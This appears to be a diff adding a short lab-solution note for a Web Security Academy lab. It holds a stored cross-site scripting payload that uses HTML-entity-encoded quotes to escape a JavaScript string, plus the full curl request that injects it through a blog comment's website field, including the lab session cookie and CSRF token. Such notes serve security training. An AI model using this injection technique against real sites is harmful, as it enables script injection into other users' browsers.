@@ -1,0 +1,11 @@
+
+
+
+http://test.ir&apos;-alert(1)-&apos;
+
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0aeb006b0362e65a8239014100b00032.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 130' -H $'Origin: https://0aeb006b0362e65a8239014100b00032.web-security-academy.net' -H $'Referer: https://0aeb006b0362e65a8239014100b00032.web-security-academy.net/post?postId=7' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' -H $'Connection: close' \
+    -b $'session=CFq3yjwnGHa66wpI3tebsKwjyRwuEloK' \
+    --data-binary $'csrf=whpgYNRTKcEsBKaPKX20dtgAFfJLUtau&postId=7&comment=test&name=ts&email=test1@test.com&website=http://test.ir?&apos;-alert(1)-&apos;' \
+    $'https://0aeb006b0362e65a8239014100b00032.web-security-academy.net/post/comment'
